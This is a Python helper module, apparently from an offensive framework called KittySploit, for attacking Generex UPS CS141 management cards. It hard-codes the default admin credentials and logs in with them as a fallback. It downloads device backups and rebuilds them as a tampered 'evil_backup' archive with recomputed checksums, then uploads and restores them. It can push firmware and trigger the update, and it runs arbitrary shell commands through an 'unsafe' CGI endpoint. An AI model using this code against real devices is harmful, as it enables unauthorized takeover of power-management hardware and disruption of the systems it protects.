#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import json
import os
import shutil
import tarfile
import tempfile
import time
from pathlib import Path
from urllib.parse import quote

from core.framework.base_module import BaseModule


class CS141(BaseModule):
    """Helpers shared by Generex UPS CS141 modules."""

    DEFAULT_USERNAME = "admin"
    DEFAULT_PASSWORD = "cs141-snmp"
    DEFAULT_PASSWORD_HASH = (
        "$2$4CDE44A50692C926C21E457D8C1C7DAE54FCC687D71947418C3470CCED708BA4DDA084CE2068D7CD"
        "4103ECC212A64F8C3A7BAA3C041E655A50CD78D0051B66CF"
    )

    @staticmethod
    def cs141_normalize_base_path(path_value: str) -> str:
        value = (path_value or "/").strip()
        if value == "/":
            return "/"
        if not value.startswith("/"):
            value = "/" + value
        return "/" + value.strip("/")

    @staticmethod
    def cs141_join_path(base_path: str, *parts: str) -> str:
        clean = [part.strip("/") for part in parts if part and part.strip("/")]
        root = CS141.cs141_normalize_base_path(base_path)
        if not clean:
            return root
        if root == "/":
            return "/" + "/".join(clean)
        return root + "/" + "/".join(clean)

    @staticmethod
    def cs141_basic_auth_value(username: str, password: str) -> str:
        raw = f"{username}:{password}".encode("ascii", errors="ignore")
        return "Basic " + base64.b64encode(raw).decode("ascii")

    def cs141_auth_headers(self, username: str, password: str, content_type: str = "application/json"):
        return {
            "User-Agent": "Mozilla/5.0 KittySploit",
            "Accept": "application/json, text/plain, */*",
            "Authorization": self.cs141_basic_auth_value(username, password),
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": content_type,
            "DNT": "1",
            "Connection": "close",
        }

    def cs141_default_auth_headers(self, content_type: str = "application/json"):
        return self.cs141_auth_headers(self.DEFAULT_USERNAME, self.DEFAULT_PASSWORD, content_type=content_type)

    @staticmethod
    def cs141_unauth_upload_headers(content_type: str = "text/html"):
        return {
            "User-Agent": "Mozilla/5.0 KittySploit",
            "Accept": "application/json, text/plain, */*",
            "X-HTTP-Method-Override": "PUT",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": content_type,
            "DNT": "1",
            "Connection": "close",
        }

    @staticmethod
    def cs141_power_headers():
        return {
            "User-Agent": "Mozilla/5.0 KittySploit",
            "Accept": "application/json, text/plain, */*",
            "X-HTTP-Method-Override": "PUT",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "DNT": "1",
            "Connection": "close",
        }

    def _cs141_base(self) -> str:
        return self.cs141_normalize_base_path(self.path)

    def cs141_login(self, username: str, password: str):
        try:
            response = self.http_request(
                method="POST",
                path=self.cs141_join_path(self._cs141_base(), "api", "login"),
                headers=self.cs141_auth_headers(username, password),
                data=json.dumps({"anonymous": "", "password": password, "userName": username}),
                allow_redirects=True,
                timeout=15,
                session=True,
            )
        except Exception:
            return None

        if response and getattr(response, "ok", False):
            return {
                "ok": True,
                "username": username,
                "password": password,
                "cookies": self.get_cookies(),
                "used_default_credentials": (
                    username == self.DEFAULT_USERNAME and password == self.DEFAULT_PASSWORD
                ),
            }
        return None

    def cs141_get_auth_context(self, username: str, password: str, try_default: bool = True):
        if username and password:
            ctx = self.cs141_login(username, password)
            if ctx:
                return ctx

        if try_default:
            ctx = self.cs141_login(self.DEFAULT_USERNAME, self.DEFAULT_PASSWORD)
            if ctx:
                return ctx
            return {
                "ok": False,
                "username": self.DEFAULT_USERNAME,
                "password": self.DEFAULT_PASSWORD,
                "cookies": {},
                "used_default_credentials": True,
            }

        return None

    def cs141_download_backup(self, auth_ctx):
        try:
            response = self.http_request(
                method="GET",
                path=self.cs141_join_path(self._cs141_base(), "cgi-bin", "backup.sh"),
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"]),
                cookies=auth_ctx.get("cookies") or None,
                timeout=30,
            )
        except Exception:
            return None

        if response and getattr(response, "ok", False):
            return response.content
        return None

    def cs141_upload_backup(self, backup_bytes: bytes, auth_ctx):
        try:
            return self.http_request(
                method="PUT",
                path=self.cs141_join_path(self._cs141_base(), "upload", "backup.tar.gz") + "?restore_network=false",
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"], content_type="application/gzip"),
                cookies=auth_ctx.get("cookies") or None,
                data=backup_bytes,
                timeout=60,
            )
        except Exception:
            return None

    def cs141_trigger_restore(self, auth_ctx):
        try:
            return self.http_request(
                method="GET",
                path=self.cs141_join_path(self._cs141_base(), "cgi-bin-unsafe", "getRestoreStatus.sh"),
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"]),
                cookies=auth_ctx.get("cookies") or None,
                timeout=30,
            )
        except Exception:
            return None

    def cs141_upload_firmware(self, firmware_bytes: bytes, auth_ctx):
        try:
            return self.http_request(
                method="PUT",
                path=self.cs141_join_path(self._cs141_base(), "upload", "update082.tar.gz") + "?reset=false",
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"], content_type="application/gzip"),
                cookies=auth_ctx.get("cookies") or None,
                data=firmware_bytes,
                timeout=60,
            )
        except Exception:
            return None

    def cs141_trigger_update(self, auth_ctx):
        try:
            return self.http_request(
                method="GET",
                path=self.cs141_join_path(self._cs141_base(), "cgi-bin-unsafe", "getUpdateStatus.sh"),
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"]),
                cookies=auth_ctx.get("cookies") or None,
                timeout=30,
            )
        except Exception:
            return None

    def cs141_exec_unsafe_command(self, command: str, auth_ctx):
        encoded = quote(command, safe="")
        try:
            return self.http_request(
                method="GET",
                path=self.cs141_join_path(self._cs141_base(), "cgi-bin-unsafe", "backupCheck.sh") + f"?code={encoded}",
                headers=self.cs141_auth_headers(auth_ctx["username"], auth_ctx["password"]),
                cookies=auth_ctx.get("cookies") or None,
                timeout=30,
            )
        except Exception:
            return None

    @staticmethod
    def _safe_extract(tar_path: Path, destination: Path):
        destination.mkdir(parents=True, exist_ok=True)
        with tarfile.open(tar_path, "r:*") as archive:
            dest_root = destination.resolve()
            for member in archive.getmembers():
                member_path = (destination / member.name).resolve()
                if not str(member_path).startswith(str(dest_root)):
                    raise ValueError(f"Unsafe archive entry: {member.name}")
            archive.extractall(destination)

    @staticmethod
    def _add_tree_to_tar(archive: tarfile.TarFile, source_dir: Path):
        for root, dirs, files in os.walk(source_dir):
            dirs.sort()
            files.sort()
            root_path = Path(root)
            rel_root = root_path.relative_to(source_dir)
            if str(rel_root) != ".":
                archive.add(str(root_path), arcname=str(rel_root), recursive=False)
            for name in files:
                full_path = root_path / name
                arcname = str((rel_root / name) if str(rel_root) != "." else Path(name))
                archive.add(str(full_path), arcname=arcname, recursive=False)

    def cs141_extract_backup(self, backup_bytes: bytes):
        workdir = Path(tempfile.mkdtemp(prefix="cs141_"))
        backup_tar = workdir / "backup.tar.gz"
        backup_dir = workdir / "backup"
        system_dir = workdir / "system"
        backup_tar.write_bytes(backup_bytes)

        self._safe_extract(backup_tar, backup_dir)
        system_tar = backup_dir / "gxserve" / "system.tar"
        self._safe_extract(system_tar, system_dir)

        return {
            "workdir": workdir,
            "backup_tar": backup_tar,
            "backup_dir": backup_dir,
            "system_tar": system_tar,
            "system_dir": system_dir,
        }

    def cs141_rebuild_backup(self, ctx):
        system_tar = ctx["system_tar"]
        backup_dir = ctx["backup_dir"]
        system_dir = ctx["system_dir"]
        final_backup = ctx["workdir"] / "evil_backup.tar.gz"

        with tarfile.open(system_tar, mode="w") as archive:
            self._add_tree_to_tar(archive, system_dir)

        checksum = hashlib.md5(system_tar.read_bytes()).hexdigest()
        (backup_dir / "gxserve" / "system.tar.md5").write_text(f"{checksum}  system.tar\n", encoding="utf-8")

        with tarfile.open(final_backup, mode="w:gz") as archive:
            self._add_tree_to_tar(archive, backup_dir)

        return final_backup.read_bytes()

    @staticmethod
    def cs141_cleanup_workdir(ctx):
        workdir = ctx.get("workdir")
        if workdir:
            shutil.rmtree(workdir, ignore_errors=True)

    @staticmethod
    def cs141_response_body(response):
        if not response:
            return ""
        data = getattr(response, "text", "")
        return (data or "").replace("<pre>", "").replace("</pre>", "").strip()

    @staticmethod
    def cs141_save_output(content: bytes, output_path: str, fallback_name: str):
        path = Path(output_path).expanduser() if output_path else Path("/tmp") / fallback_name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content)
        return str(path)
